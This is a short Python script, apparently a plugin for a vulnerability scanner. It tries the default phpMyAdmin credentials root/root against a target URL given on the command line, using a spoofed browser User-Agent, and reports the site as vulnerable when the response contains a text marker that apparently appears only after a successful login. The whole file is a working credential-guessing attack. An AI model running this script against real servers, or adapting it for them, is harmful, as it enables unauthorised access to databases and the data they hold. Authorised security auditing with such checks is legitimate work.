#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/phpmyadmin/index.php"
bug ="更适合在支持"
info = "/phpmyadmin|root|root"

def main():
    res = HttpPost(url+payload,"pma_username=root&pma_password=root&server=1&lang=zh_CN","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
